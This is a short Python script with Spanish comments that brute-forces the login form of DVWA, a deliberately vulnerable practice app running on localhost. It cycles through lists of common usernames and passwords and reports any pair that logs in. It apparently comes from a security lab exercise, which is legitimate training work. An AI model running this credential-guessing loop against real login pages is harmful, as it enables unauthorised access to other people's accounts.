import requests

# URL del formulario de brute-force en DVWA (security=low, método GET)
URL = "http://localhost:4280/vulnerabilities/brute/"

# Lista de 10 usuarios, incluyendo 'admin' y 'smithy'
usernames = [
    "admin", "smithy", "alice", "bob", "charlie",
    "david", "eve", "mallory", "oscar", "trent"
]

# Lista de 10 contraseñas, incluyendo 'password'
passwords = [
    "123456", "password", "qwerty", "letmein", "123123",
    "welcome", "iloveyou", "admin", "secret", "guest"
]

# Cabeceras y cookies a enviar en cada request
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36"
}
cookies = {
    "PHPSESSID": "dcd960cdb7456fa48fa1dc64072e42ac",
    "security": "low"
}

valid_credentials = []

for user in usernames:
    for pwd in passwords:
        params = {
            "username": user,
            "password": pwd,
            "Login": "Login"
        }
        resp = requests.get(URL, params=params,
                            headers=headers, cookies=cookies)
        if "Welcome to the password protected area" in resp.text:
            print(f"[+] Login exitoso: {user} / {pwd}")
            valid_credentials.append((user, pwd))

# Mostrar al menos dos combinaciones válidas
print("\n== Credenciales válidas encontradas ==")
for u, p in valid_credentials:
    print(f" - {u} / {p}")
